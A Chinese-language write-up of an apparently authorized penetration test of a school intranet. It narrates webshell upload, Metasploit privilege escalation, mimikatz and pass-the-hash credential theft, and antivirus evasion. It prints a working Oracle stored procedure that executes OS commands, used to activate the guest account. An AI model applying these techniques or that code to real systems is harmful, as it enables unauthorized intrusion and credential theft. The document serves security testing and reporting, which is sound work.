### 初探内网

在获得信息中心老师的授权后，我开始对学校内网进行渗透测试。首先，我对学校内网中的系统进行了详细的信息搜集。大部分系统都使用了新版且未爆出0day漏洞的框架组件，这使得初始阶段的攻击尝试陷入困境。然而，在进一步检查学校的各个Web系统时，我发现了一些有趣的目标。

尽管学校已经引入了许多新系统，但旧系统并未完全关闭。经过仔细搜索，我确认了一个旧系统存在任意文件上传漏洞。这个漏洞没有任何过滤机制，因此可以轻易利用。通过该漏洞，我还成功获取了一句话木马的路径。但在连接过程中遇到了一个奇怪的现象：使用蚁剑和菜刀连接返回的路径不同，其中的文件也有所不同。蚁剑连接的shell无法上传文件，而菜刀连接的shell则可以，并且每次执行命令后都会被封禁IP，怀疑有WAF（Web应用防火墙）的存在。

为了解决这个问题，我上传了一个MSF（Metasploit Framework）的aspx木马以获取meterpreter会话。接着，使用`windows-exploit-suggester`工具探测未打补丁的漏洞，发现目标系统存在MS16-075漏洞。利用该漏洞配合`juicy_potato`模块进行攻击，最终获得了system权限。随后，我对机器进行了信息搜集，获取有助于横向渗透的数据。值得注意的是，该机器原本属于域环境，但现在已脱离域控管理，因此我们重点转向密码撞库。使用MSF自带的mimikatz模块成功获取了几台机器的密码。此外，还有一些机器开放了445端口但未开启3389端口，对于这些机器，我选择了更稳妥的psexec模块进行哈希传递攻击，同样获取到了SYSTEM权限。

接下来的任务变得较为常规，主要是不断收集密码并通过密码撞库获取更多机器的访问权限。最终找到了边界路由器，但由于之前收集的密码均无法登录，只好暂时放弃对该网段的进一步探索。

## 深入探索

在继续研究新系统的过程中，我在某个功能中发现了任意文件下载漏洞。由于服务是以root用户身份运行的，最理想的情况是读取`/etc/shadow`文件并破解root用户的密码（尝试失败）。随后，我转而读取`/root/.bash_history`文件，从中获取了tomcat部署路径及备份源码文件的位置。通过对源码的分析，我发现该网段大多数机器使用Oracle数据库，并且未修改默认SID。经过一番爆破，发现一台机器上的Oracle数据库system用户密码仍为默认值“manager”。考虑到Oracle数据库支持执行系统命令，我找到一个简化操作的工具，直接通过SQL语句执行命令。

## 绕过火绒行为检测

然而，新的问题出现了：作为system用户，我只能执行少量命令。一旦使用如`net user`等命令时，便没有回显。经过调查，发现这是由于火绒安全软件拦截了异常行为所致。于是，我尝试通过Navicat中的sqlplus连接服务器，并根据网络上提供的步骤编写了执行命令的代码。通过这种方式，我可以根据服务器返回的1或0判断命令是否成功执行。

    ```sql
    create or replace and compile Java Source named "OSCommand" as
    -- java:        OS COMMAND
    import java.io.*;
    import java.lang.*;
    public class OSCommand{
            public static String Run(String Command){
                    Runtime rt = Runtime.getRuntime();
                    int     rc = -1;
                    try{
                            Process p = rt.exec( Command );
                            int bufSize = 32000;
                            int len = 0;
                            byte buffer[] = new byte[bufSize];
                            String s = null;
                            BufferedInputStream bis = new BufferedInputStream( p.getInputStream(), bufSize );
                            len = bis.read( buffer, 0, bufSize );
                            rc = p.waitFor();
                            if ( len != -1 ){
                                    s = new String( buffer, 0, len );
                                    return( s );
                            }
                            return( rc+"" );
                    }
                    catch (Exception e){
                            e.printStackTrace();
                            return(  "-1\ncommand[" + Command + "]\n" + e.getMessage() );
                    }
            }
    }
    /
    show errors
    create or replace function OSexec( cCommand IN string ) return varchar2 is
    -- function:    OS EXEC
    -- descr:       PL/SQL wrapper for the Java OSCOMMAND stored proc
    --    language        JAVA
    name            'OSCommand.Run(java.lang.String) return java.lang.String';
    /
    show errors
    -- sysdba. Substitute SCOTT with the applicable schema that owns the OSEXEC
    -- and OSCOMMAND stored procs.
    declare
            SCHEMA  varchar2(30) := 'SCOTT';
    begin
            dbms_java.grant_permission(
                    SCHEMA,
                    'SYS:java.io.FilePermission',
                    '>',
                    'execute'
            );
            dbms_java.grant_permission(
                    SCHEMA,
                    'SYS:java.lang.RuntimePermission',
                    'writeFileDescriptor',
                    '*'
            );
            dbms_java.grant_permission(
                    SCHEMA,
                    'SYS:java.lang.RuntimePermission',
                    'readFileDescriptor',
                    '*'
            );
    commit;
    end;
    /
    -- 查看本地连接信息
    SQL> select OSexec('ipconfig') as STDOUT from dual;
    STDOUT
    --------------------------------------------------------------------------------    Windows IP ????
    ??????????? ????l?? 3:
       l??????? DNS ??? . . . . . . . :
       ????t?? IPv6 ???. . . . . . . . : *************
       IPv4 ??? . . . . . . . . . . . . : 192.168.100.100
       ????????  . . . . . . . . . . . . : 255.255.255.0
       ??????. . . . . . . . . . . . . : 0.0.0.0
    --激活guest账号
     SQL> select OSexec('cmd.exe /c net user guest /active:yes') as STDOUT from dual;
    STDOUT
    --------------------------------------------------------------------------------    0
    ```

通过上述方法，我绕过了火绒的行为检测。当我尝试直接启用3389端口时，火绒并未拦截。然而，执行`net user`等命令时仍然失败。这时，我想起了guest用户。通过激活guest用户并将其加入管理员组，我成功远程桌面连接到该机器。但是，无论是使用mimikatz还是反弹shell到CS（Cobalt Strike）均告失败。此外，guest用户还被限制了一些敏感操作，如添加用户等。

在执行`net user`命令时，我发现了一个之前见过且拥有其密码的用户。通过sqlplus将该用户加入管理员组，再次登录后依然无法反弹shell或读取明文密码。此时，学弟建议直接关闭火绒防护，从而顺利获取了shell。尽管如此，我还是无法读取明文密码，于是决定dump出哈希值进行爆破。最终，通过在线NTLM解密网站获取了密码，再次进入熟悉的撞库、信息搜集和再撞库循环。

最后，在服务器上发现了一个保存多台服务器密码的xftp配置文件。利用星号密码查看器工具，成功获取了这些密码，进而控制了几台具有root权限的机器。鉴于即将来临的考试，我没有继续深入探究，而是记录下所有收集到的密码和用户信息，并对整个网段的机器进行了撞库测试，发现了大量弱口令。

希望以上内容能为信息中心老师提供帮助，感谢各位大佬的理解与支持！